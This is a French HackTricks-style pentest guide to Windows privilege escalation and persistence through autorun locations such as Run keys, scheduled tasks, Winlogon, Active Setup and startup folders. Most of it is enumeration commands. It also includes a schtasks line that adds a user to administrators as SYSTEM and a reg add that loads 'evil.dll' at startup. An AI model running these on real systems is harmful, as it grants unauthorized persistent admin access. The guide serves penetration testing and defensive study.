# Escalade de privilèges avec Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** peut être utilisé pour exécuter des programmes au **démarrage**. Voir quels binaires sont programmés pour s'exécuter au démarrage avec :
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Tâches planifiées

**Les tâches** peuvent être programmées pour s'exécuter avec **une certaine fréquence**. Voir quels binaires sont programmés pour s'exécuter avec :
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Dossiers

Tous les binaires situés dans les **dossiers de démarrage vont être exécutés au démarrage**. Les dossiers de démarrage courants sont ceux énumérés ci-dessous, mais le dossier de démarrage est indiqué dans le registre. [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registre

> [!NOTE]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f) : L'entrée de registre **Wow6432Node** indique que vous exécutez une version 64 bits de Windows. Le système d'exploitation utilise cette clé pour afficher une vue séparée de HKEY_LOCAL_MACHINE\SOFTWARE pour les applications 32 bits qui s'exécutent sur des versions Windows 64 bits.

### Exécutions

**Connu sous le nom de** registre AutoRun :

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Les clés de registre connues sous le nom de **Run** et **RunOnce** sont conçues pour exécuter automatiquement des programmes chaque fois qu'un utilisateur se connecte au système. La ligne de commande assignée en tant que valeur de données d'une clé est limitée à 260 caractères ou moins.

**Exécutions de service** (peut contrôler le démarrage automatique des services lors du démarrage) :

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx :**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Sur Windows Vista et les versions ultérieures, les clés de registre **Run** et **RunOnce** ne sont pas générées automatiquement. Les entrées dans ces clés peuvent soit démarrer directement des programmes, soit les spécifier comme dépendances. Par exemple, pour charger un fichier DLL à la connexion, on pourrait utiliser la clé de registre **RunOnceEx** avec une clé "Depend". Cela est démontré en ajoutant une entrée de registre pour exécuter "C:\temp\evil.dll" lors du démarrage du système :
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!NOTE]
> **Exploitation 1** : Si vous pouvez écrire dans l'un des registres mentionnés dans **HKLM**, vous pouvez élever les privilèges lorsqu'un autre utilisateur se connecte.

> [!NOTE]
> **Exploitation 2** : Si vous pouvez écraser l'un des binaires indiqués dans l'un des registres dans **HKLM**, vous pouvez modifier ce binaire avec une porte dérobée lorsqu'un autre utilisateur se connecte et élever les privilèges.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Chemin de démarrage

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Les raccourcis placés dans le dossier **Démarrage** déclencheront automatiquement le lancement de services ou d'applications lors de la connexion de l'utilisateur ou du redémarrage du système. L'emplacement du dossier **Démarrage** est défini dans le registre pour les portées **Local Machine** et **Current User**. Cela signifie que tout raccourci ajouté à ces emplacements **Démarrage** spécifiés garantira que le service ou le programme lié démarre après le processus de connexion ou de redémarrage, ce qui en fait une méthode simple pour programmer des programmes à s'exécuter automatiquement.

> [!NOTE]
> Si vous pouvez écraser n'importe quel \[User] Shell Folder sous **HKLM**, vous pourrez le pointer vers un dossier contrôlé par vous et placer une porte dérobée qui sera exécutée chaque fois qu'un utilisateur se connecte au système, escaladant ainsi les privilèges.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Clés Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Typiquement, la clé **Userinit** est définie sur **userinit.exe**. Cependant, si cette clé est modifiée, l'exécutable spécifié sera également lancé par **Winlogon** lors de la connexion de l'utilisateur. De même, la clé **Shell** est destinée à pointer vers **explorer.exe**, qui est le shell par défaut pour Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!NOTE]
> Si vous pouvez écraser la valeur du registre ou le binaire, vous pourrez élever les privilèges.

### Paramètres de politique

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Vérifiez la clé **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Changer l'invite de commande en mode sans échec

Dans le Registre Windows sous `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, il y a une valeur **`AlternateShell`** définie par défaut sur `cmd.exe`. Cela signifie que lorsque vous choisissez "Mode sans échec avec invite de commande" au démarrage (en appuyant sur F8), `cmd.exe` est utilisé. Cependant, il est possible de configurer votre ordinateur pour qu'il démarre automatiquement en mode sans échec sans avoir besoin d'appuyer sur F8 et de le sélectionner manuellement.

Étapes pour créer une option de démarrage pour démarrer automatiquement en "Mode sans échec avec invite de commande" :

1. Changez les attributs du fichier `boot.ini` pour supprimer les drapeaux de lecture seule, système et caché : `attrib c:\boot.ini -r -s -h`
2. Ouvrez `boot.ini` pour modification.
3. Insérez une ligne comme : `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Enregistrez les modifications apportées à `boot.ini`.
5. Réappliquez les attributs de fichier d'origine : `attrib c:\boot.ini +r +s +h`

- **Exploit 1 :** Changer la clé de registre **AlternateShell** permet de configurer un shell de commande personnalisé, potentiellement pour un accès non autorisé.
- **Exploit 2 (Permissions d'écriture PATH) :** Avoir des permissions d'écriture sur n'importe quelle partie de la variable **PATH** du système, en particulier avant `C:\Windows\system32`, vous permet d'exécuter un `cmd.exe` personnalisé, qui pourrait être une porte dérobée si le système est démarré en mode sans échec.
- **Exploit 3 (Permissions d'écriture PATH et boot.ini) :** L'accès en écriture à `boot.ini` permet un démarrage automatique en mode sans échec, facilitant l'accès non autorisé au prochain redémarrage.

Pour vérifier le paramètre **AlternateShell** actuel, utilisez ces commandes :
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Composant installé

Active Setup est une fonctionnalité de Windows qui **s'initie avant que l'environnement de bureau ne soit complètement chargé**. Elle priorise l'exécution de certaines commandes, qui doivent se terminer avant que la connexion de l'utilisateur ne se poursuive. Ce processus se produit même avant que d'autres entrées de démarrage, telles que celles dans les sections de registre Run ou RunOnce, ne soient déclenchées.

Active Setup est géré à travers les clés de registre suivantes :

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Dans ces clés, divers sous-clés existent, chacune correspondant à un composant spécifique. Les valeurs clés d'un intérêt particulier incluent :

- **IsInstalled :**
- `0` indique que la commande du composant ne s'exécutera pas.
- `1` signifie que la commande s'exécutera une fois pour chaque utilisateur, ce qui est le comportement par défaut si la valeur `IsInstalled` est manquante.
- **StubPath :** Définit la commande à exécuter par Active Setup. Cela peut être n'importe quelle ligne de commande valide, comme lancer `notepad`.

**Aperçus de sécurité :**

- Modifier ou écrire dans une clé où **`IsInstalled`** est défini sur `"1"` avec un **`StubPath`** spécifique peut entraîner l'exécution non autorisée de commandes, potentiellement pour une élévation de privilèges.
- Altérer le fichier binaire référencé dans toute valeur **`StubPath`** pourrait également permettre une élévation de privilèges, si les permissions sont suffisantes.

Pour inspecter les configurations **`StubPath`** à travers les composants Active Setup, ces commandes peuvent être utilisées :
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Objets d'Aide au Navigateur

### Aperçu des Objets d'Aide au Navigateur (BHO)

Les Objets d'Aide au Navigateur (BHO) sont des modules DLL qui ajoutent des fonctionnalités supplémentaires à Internet Explorer de Microsoft. Ils se chargent dans Internet Explorer et l'Explorateur Windows à chaque démarrage. Cependant, leur exécution peut être bloquée en définissant la clé **NoExplorer** à 1, les empêchant de se charger avec les instances de l'Explorateur Windows.

Les BHO sont compatibles avec Windows 10 via Internet Explorer 11 mais ne sont pas pris en charge dans Microsoft Edge, le navigateur par défaut des versions plus récentes de Windows.

Pour explorer les BHO enregistrés sur un système, vous pouvez inspecter les clés de registre suivantes :

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Chaque BHO est représenté par son **CLSID** dans le registre, servant d'identifiant unique. Des informations détaillées sur chaque CLSID peuvent être trouvées sous `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Pour interroger les BHO dans le registre, ces commandes peuvent être utilisées :
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Extensions Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Notez que le registre contiendra 1 nouveau registre par chaque dll et il sera représenté par le **CLSID**. Vous pouvez trouver les informations CLSID dans `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Pilotes de police

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Options d'exécution de fichiers image
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Notez que tous les sites où vous pouvez trouver des autoruns ont **déjà été recherchés par** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Cependant, pour une **liste plus complète des fichiers auto-exécutés**, vous pourriez utiliser [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) de Sysinternals :
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Plus

**Trouvez plus d'Autoruns comme les enregistrements dans** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Références

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)



{{#include ../../banners/hacktricks-training.md}}
